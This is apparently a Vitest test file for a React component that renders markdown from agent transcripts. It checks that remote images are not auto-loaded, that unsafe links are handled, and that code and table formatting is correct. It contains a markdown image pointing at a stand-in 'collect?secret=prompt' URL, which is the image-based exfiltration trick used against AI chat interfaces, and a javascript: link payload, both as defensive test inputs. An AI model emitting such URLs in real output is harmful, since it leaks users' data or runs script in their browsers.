import { expect, it } from 'vitest'
import { renderToStaticMarkup } from 'react-dom/server'
import { MessageMarkdown } from './MessageMarkdown'

it('does not auto-load remote images from an agent transcript', () => {
  const html = renderToStaticMarkup(<MessageMarkdown text={'![private screenshot](https://example.invalid/collect?secret=prompt)'} />)
  expect(html).not.toContain('<img')
  expect(html).toContain('private screenshot')
})
it('renders links without opener or referrer and drops script URLs', () => {
  const external = renderToStaticMarkup(<MessageMarkdown text={'[source](https://example.com)'} />)
  expect(external).toContain('rel="noopener noreferrer"')
  const script = renderToStaticMarkup(<MessageMarkdown text={'[run](javascript:alert(1))'} />)
  expect(script).not.toContain('javascript:')
})
it('gives a fenced block a language label and a copy action', () => {
  const html = renderToStaticMarkup(<MessageMarkdown text={'```ts\nconst a = 1\n```'} />)
  expect(html).toContain('>ts<')
  expect(html).toContain('aria-label="코드 복사"')
  expect(html).toContain('const a = 1')
})
it('keeps inline code free of block controls and machine translation', () => {
  const html = renderToStaticMarkup(<MessageMarkdown text={'use `pnpm test` here'} />)
  expect(html).not.toContain('코드 복사')
  expect(html).toContain('translate="no"')
})
it('lets a wide table scroll on its own', () => {
  const html = renderToStaticMarkup(<MessageMarkdown text={'| a | b |\n| - | - |\n| 1 | 2 |'} />)
  expect(html).toMatch(/<div[^>]*data-scroll="x"[^>]*><table/)
})
